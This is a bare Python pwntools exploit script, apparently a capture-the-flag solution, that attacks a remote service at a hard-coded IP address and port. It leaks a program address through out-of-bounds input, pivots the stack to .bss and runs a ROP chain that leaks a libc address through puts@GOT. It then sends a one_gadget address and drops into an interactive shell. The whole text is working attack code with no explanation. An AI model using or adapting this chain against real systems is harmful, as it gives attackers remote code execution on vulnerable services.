from  pwn import *

io=remote('39.108.238.37',55555)

def a(data):
    io.recvuntil(': ')
    io.sendline(data)
for i in range(26):
    a('0')
a('+')
a('+')
a('+')
io.recvuntil('= ')
init_low=int(io.recvline())
if init_low<0:
    init_low=init_low+2**32
a('+')
io.recvuntil('= ')
init_high=int(io.recvline())
init=(init_high<<32)+init_low
print(hex(init))
base=init-0x0B40
bss=base+0x201420-0x18
print(hex(bss))
pop_rdi=base+0x0ba3
pop_rsp=base+0x0b9d
pop_rsi=base+0x0ba1
puts_plt=base+0x00810
write_plt=base+0x0820
puts_got=base+0x201238
read_plt=base+0x00850

a(str(pop_rsp&0xffffffff))
a(str(pop_rsp>>32))
a(str(bss&0xffffffff))
a(str(bss>>32))
pl=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(puts_got)+p64(0)+p64(write_plt)
pl+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(puts_got)+p64(0)+p64(read_plt)
pl+=p64(puts_plt)
io.send(pl)

io.recvuntil('your name?\n',True)
libc=u64(io.recv(8))-0x06f690
print(hex(libc))
one_gadget=libc+0xf1147
io.sendline(p64(one_gadget))

io.interactive()